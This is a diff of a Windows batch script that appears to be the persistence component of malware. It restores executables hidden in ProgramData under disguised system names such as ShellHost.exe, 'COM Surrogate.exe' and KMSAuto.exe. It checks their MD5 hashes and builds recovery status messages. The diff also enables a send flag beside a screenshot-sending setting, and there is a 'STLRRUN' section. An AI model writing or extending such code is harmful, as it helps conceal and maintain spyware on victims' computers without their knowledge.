@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=20.4"
+set "BATCHVERSION=20.5"
 
 
 
@@ -133,7 +133,7 @@ echo ProtectionWindowsHostProcess.exe is not running. Continue.....
 
 
 echo Maybe Turning CheckSend=1
-set "CheckSend=0"
+set "CheckSend=1"
 set "SENDSCREENSHOT=1"
 set "lastMinute=none"
 echo.
@@ -437,6 +437,7 @@ set "startupFile=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
     copy "%sourceFile%" "%startupFile%"
+    set "MESSAGE=CWProcessRecovered^|"
 ) else (
     echo File is already in %startupFile%.
 )
@@ -463,6 +464,7 @@ set "startupFile=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
     copy "%sourceFile%" "%startupFile%"
+    set "MESSAGE=%MESSAGE%SHSTRecovered^|"
 ) else (
     echo File is already in %startupFile%.
 )
@@ -487,6 +489,7 @@ set "startupFile=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
     copy "%sourceFile%" "%startupFile%"
+    set "MESSAGE=%MESSAGE%COMRecovered^|"
 ) else (
     echo File is already in %startupFile%.
 )
@@ -507,6 +510,9 @@ timeout /t 1 /nobreak >nul
 echo :KMS
 echo.
 
+set "CheckSenddd=0"
+
+
 :: Define the paths
 set "sourceFile=%SystemRoot%\System32\TSSKMS.exe"
 set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
@@ -515,15 +521,21 @@ set "startupFile=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 if not exist "%startupFile%" (
     echo File not found in Startup folder. Restoring...
     copy "%sourceFile%" "%startupFile%"
+    set "MESSAGE=%MESSAGE%KMSRecovered^|"
+    set "CheckSenddd=1"
 ) else (
     echo File is already in %startupFile%.
 )
 
 timeout /t 1 /nobreak >nul
 
+echo MESSAGE KMS IS = %MESSAGE%
+echo CheckSenddd IS = %CheckSenddd% and !CheckSenddd!
 
 
 
+
+goto :CHECKSTARTUPPROGRAMS
 
 :STLRRUN
 echo :STLRRUN
@@ -546,11 +558,7 @@ timeout /t 1 /nobreak >nul
 
 
 
-
-
-
-
-
+:: THIS PLACE IS IGNORED
 
 
 
@@ -680,7 +688,7 @@ if "%SHSTFILEmd5%"=="%ShellHostMD5%" (
 )
 
 echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
-set "MESSAGE=MD5SHSTMISMATCH^|"
+set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
 
 
 echo.
